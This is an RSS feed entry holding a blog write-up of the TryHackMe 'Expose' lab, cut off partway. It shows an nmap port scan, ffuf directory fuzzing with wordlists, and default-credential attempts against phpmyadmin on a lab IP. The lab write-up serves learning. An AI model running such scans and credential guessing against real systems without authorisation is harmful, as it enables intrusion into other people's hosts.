<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Linux on 0000FF</title><link>https://simonefelici.github.io/tags/linux/</link><description>Recent content in Linux on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 28 Jan 2024 15:00:00 +0000</lastBuildDate><atom:link href="https://simonefelici.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml"/><item><title>Expose Writeup THM</title><link>https://simonefelici.github.io/p/expose-writeup-thm/</link><pubDate>Sun, 28 Jan 2024 15:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/expose-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png" alt="Featured image of post Expose Writeup THM" />&lt;p>First of all I am going to start with an nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;span class="lnt">82
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sC -sV -p- 10.10.229.207
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-28 07:58 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.229.207
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.055s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">65530&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp vsftpd 2.0.8 or later
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ftp-anon: Anonymous FTP login allowed &lt;span class="o">(&lt;/span>FTP code 230&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ftp-syst:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> STAT:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> FTP server status:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connected to ::ffff:10.11.65.91
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Logged in as ftp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> TYPE: ASCII
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> No session bandwidth limit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Session timeout in seconds is &lt;span class="m">300&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Control connection is plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Data connections will be plain text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> At session startup, client count was &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> vsFTPd 3.0.3 - secure, fast, stable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_End of status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">3072&lt;/span> 9c:ef:fe:df:c3:55:d8:25:47:76:64:01:dc:93:53:50 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> c9:45:fb:a7:e9:ae:2c:48:46:8f:86:82:64:a0:20:d0 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 9b:25:8f:19:62:39:c6:05:ef:e5:f6:02:3f:c0:12:30 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain ISC BIND 9.16.1 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> dns-nsid:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ bind.version: 9.16.1-Ubuntu
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1337/tcp open http Apache httpd 2.4.41 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: EXPOSED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.41 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1883/tcp open mosquitto version 1.6.9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> mqtt-subscribe:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Topics and their most recent payloads:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/bytes/received/5min: 13.55
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/publish/bytes/sent: &lt;span class="m">63&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/sockets/5min: 0.57
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/clients/inactive: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/messages/sent/1min: 13.71
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/retained messages/count: &lt;span class="m">35&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/bytes/sent/1min: 406.59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/sockets/15min: 0.20
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/clients/disconnected: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/messages/received: &lt;span class="m">3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/store/messages/bytes: &lt;span class="m">149&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/bytes/sent: &lt;span class="m">445&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/messages/received/1min: 2.74
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/bytes/received/15min: 4.57
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/bytes/received: &lt;span class="m">69&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/heap/maximum: &lt;span class="m">51456&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/messages/sent/15min: 0.99
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/publish/sent/1min: 10.96
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/connections/5min: 0.39
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/publish/messages/sent: &lt;span class="m">12&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/messages/received/5min: 0.59
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/clients/maximum: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/clients/connected: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/messages/sent: &lt;span class="m">15&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/connections/15min: 0.13
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/uptime: &lt;span class="m">132&lt;/span> seconds
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/messages/stored: &lt;span class="m">32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/publish/sent/15min: 0.80
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/clients/active: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/clients/total: &lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/publish/sent/5min: 2.36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/subscriptions/count: &lt;span class="m">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/store/messages/count: &lt;span class="m">32&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/version: mosquitto version 1.6.9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/messages/sent/5min: 2.95
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/bytes/sent/15min: 29.49
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/messages/received/15min: 0.20
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/connections/1min: 1.83
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/sockets/1min: 2.43
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/load/bytes/received/1min: 63.04
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nv">$SYS&lt;/span>/broker/heap/current: &lt;span class="m">51056&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="nv">$SYS&lt;/span>/broker/load/bytes/sent/5min: 87.39
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 56.47 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We already got some important information:&lt;/p>
&lt;ul>
&lt;li>FTP server on port 21 with anonymous login allowed,&lt;/li>
&lt;li>There is a dns server,&lt;/li>
&lt;li>A web page on port 1337,&lt;/li>
&lt;li>And mosquitto is running on port 1883.&lt;/li>
&lt;/ul>
&lt;p>The web page just shows the name of the room.&lt;/p>
&lt;p>We can start a fuzzer for subdirectory enumeration:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u &lt;span class="s1">&amp;#39;http://10.10.229.207:1337/FUZZ&amp;#39;&lt;/span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.229.207:1337/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin &lt;span class="o">[&lt;/span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">javascript &lt;span class="o">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 59ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">phpmyadmin &lt;span class="o">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Admin seems like a fake page, I tried to type some emails and password and I don’t receive any response, so the real one must be phpmyadmin.&lt;/p>
&lt;p>After I tried using default credentials, I tried going back to the enumeration part and using a bigger wordlist, and I actually found another directory:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u &lt;span class="s1">&amp;#39;http://10.10.229.207:1337/FUZZ&amp;#39;&lt;/span> -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.229.207:1337/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2901ms&lt;span class="o">]&lt;/span>
